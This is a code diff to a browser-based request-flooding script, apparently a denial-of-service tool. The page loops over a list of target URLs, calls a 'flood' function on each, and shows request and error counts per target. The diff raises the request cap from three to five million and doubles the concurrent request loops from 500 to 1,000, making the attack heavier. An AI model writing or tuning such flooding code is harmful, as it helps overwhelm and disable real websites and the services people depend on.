@@ -10,7 +10,7 @@ targets.forEach((target) => {
 const statsEl = document.getElementById('stats');
 
 function printStats() {
-  statsEl.innerHTML = 'total: '+id+'<br/><table width="100%"><thead><tr><th align="left">URL</th><th align="left">Number of Requests</th><th align="left">Number of Errors</th></tr></thead><tbody>' + Object.entries(targetStats).map(([target, {
+  statsEl.innerHTML = 'total: '+id+'<br/><br/><table width="100%"><thead><tr><th align="left">URL</th><th align="left">Number of Requests</th><th align="left">Number of Errors</th></tr></thead><tbody>' + Object.entries(targetStats).map(([target, {
     number_of_requests,
     number_of_errored_responses
   }]) => '<tr><td>' + target + '</td><td>' + number_of_requests + '</td><td>' + number_of_errored_responses + '</td></tr>').join('') + '</tbody></table>'
@@ -56,18 +56,18 @@ setTimeout(() => {
   }
 
   function run() {
-    if (id === 3000000) {
+    if (id === 5000000) {
       setTimeout(() => location.href = '?'+Date.now(), 5000)
     } else {
       id++;
 
-      if (id < 3000000) {
+      if (id < 5000000) {
         flood(targets[id % targets.length], id).finally(run)
       }
     }
   }
 
-  for (let i = 0; i < 500; i++) {
+  for (let i = 0; i < 1000; i++) {
     run();
   }
 
